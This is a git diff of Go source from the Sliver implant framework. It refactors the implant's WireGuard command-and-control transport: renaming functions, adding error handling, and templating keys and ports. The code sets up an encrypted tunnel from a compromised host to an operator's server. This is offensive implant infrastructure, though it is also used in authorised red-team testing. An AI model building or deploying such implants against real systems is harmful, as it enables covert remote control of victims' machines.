@@ -1,4 +1,6 @@
-package transports
+//go:build windows || darwin || linux
+
+package wireguard
 
 /*
 	Sliver Implant Framework
@@ -27,13 +29,13 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"strconv"
 	"strings"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	"github.com/bishopfox/sliver/implant/sliver/netstack"
@@ -44,23 +46,32 @@ import (
 )
 
 var (
+	readBufSize = 16 * 1024    // 16kb
 	serverTunIP = "100.64.0.1" // Don't let user configure this for now
 	tunnelNet   *netstack.Net
 	tunAddress  string
+
+	wgImplantPrivKey  = `{{.Config.WGImplantPrivKey}}`
+	wgServerPubKey    = `{{.Config.WGServerPubKey}}`
+	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
+	wgKeyExchangePort = getWgKeyExchangePort()
+	wgTcpCommsPort    = getWgTcpCommsPort()
 )
 
+// GetTNet - Get the netstack Net object
 func GetTNet() *netstack.Net {
 	return tunnelNet
 }
 
+// GetTUNAddress - Get the TUN address
 func GetTUNAddress() string {
 	return tunAddress
 }
 
-// socketWGWriteEnvelope - Writes a message to the wireguard socket using length prefix framing
+// WriteEnvelope - Writes a message to the wireguard socket using length prefix framing
 // which is a fancy way of saying we write the length of the message then the message
 // e.g. [uint32 length|message] so the receiver can delimit messages properly
-func socketWGWriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
+func WriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -75,22 +86,23 @@ func socketWGWriteEnvelope(connection net.Conn, envelope *pb.Envelope) error {
 	return nil
 }
 
-func socketWGWritePing(connection net.Conn) error {
+// WritePing - Write a ping message to the wireguard connection
+func WritePing(connection net.Conn) error {
 	// {{if .Config.Debug}}
 	log.Print("Socket ping")
 	// {{end}}
 
 	// We don't need a real nonce here, we just need to write to the socket
-	pingBuf, _ := proto.Marshal(&sliverpb.Ping{Nonce: 31337})
-	envelope := sliverpb.Envelope{
-		Type: sliverpb.MsgPing,
+	pingBuf, _ := proto.Marshal(&pb.Ping{Nonce: 31337})
+	envelope := pb.Envelope{
+		Type: pb.MsgPing,
 		Data: pingBuf,
 	}
-	return socketWGWriteEnvelope(connection, &envelope)
+	return WriteEnvelope(connection, &envelope)
 }
 
-// socketWGReadEnvelope - Reads a message from the wireguard connection using length prefix framing
-func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
+// ReadEnvelope - Reads a message from the wireguard connection using length prefix framing
+func ReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4) // Size of uint32
 	if len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
@@ -128,7 +140,7 @@ func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Unmarshaling envelope error: %v", err)
+		log.Printf("Unmarshal envelope error: %v", err)
 		// {{end}}
 		return nil, err
 	}
@@ -136,18 +148,21 @@ func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
-// wgSocketConnect - Get a wg connection or die trying
-func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, error) {
+// WireguardConnect - Get a wg connection or die trying
+func WireguardConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 
-	_, dev, tnet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
+	_, dev, tNet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
+	if err != nil {
+		return nil, nil, err
+	}
 
 	dev.Up()
 
 	// {{if .Config.Debug}}
-	log.Printf("Intial wg connection. Attempting to connect to wg key exchange listener")
+	log.Printf("Initial wg connection. Attempting to connect to wg key exchange listener")
 	// {{end}}
 
-	keyExchangeConnection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgKeyExchangePort))
+	keyExchangeConnection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgKeyExchangePort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to wg key exchange listener: %v", err)
@@ -172,9 +187,12 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	}
 
 	// Bring up second wireguard connection using retrieved keys and IP
-	_, dev, tnet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
+	_, dev, tNet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
+	if err != nil {
+		return nil, nil, err
+	}
 
-	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
+	connection, err := tNet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, wgTcpCommsPort))
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to sliver listener: %v", err)
@@ -185,15 +203,15 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	// {{if .Config.Debug}}
 	log.Printf("Successfully connected to sliver listener")
 	// {{end}}
-	tunnelNet = tnet
+	tunnelNet = tNet
 	tunAddress = newIP
 	return connection, dev, nil
 }
 
-// bringUpWGInterface - First ceates an inet.af network stack.
+// bringUpWGInterface - First creates an inet.af network stack.
 // then creates a Wireguard device/interface and applies configuration
 func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
-	tun, tnet, err := netstack.CreateNetTUN(
+	tun, tNet, err := netstack.CreateNetTUN(
 		[]net.IP{net.ParseIP(netstackTunIP)},
 		[]net.IP{net.ParseIP("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
 		1420)
@@ -229,7 +247,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	log.Printf("Successfully set wg device config")
 	// {{end}}
 
-	return tun, dev, tnet, nil
+	return tun, dev, tNet, nil
 }
 
 // doKeyExchange - Connect to key exchange listener and retrieve new dynamic wg keys
@@ -255,6 +273,22 @@ func doKeyExchange(conn net.Conn) (string, string, string) {
 	log.Printf("Retrieved new keys, priv:%s, pub:%s, ip:%s", stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String())
 	// {{end}}
 	return stringSlice[0], stringSlice[1], net.IP(stringSlice[2]).String()
+}
+
+func getWgKeyExchangePort() int {
+	wgKeyExchangePort, err := strconv.Atoi(`{{.Config.WGKeyExchangePort}}`)
+	if err != nil {
+		return 1337
+	}
+	return wgKeyExchangePort
+}
+
+func getWgTcpCommsPort() int {
+	wgTcpCommsPort, err := strconv.Atoi(`{{.Config.WGTcpCommsPort}}`)
+	if err != nil {
+		return 8888
+	}
+	return wgTcpCommsPort
 }
 
 // {{end}} -WGc2Enabled
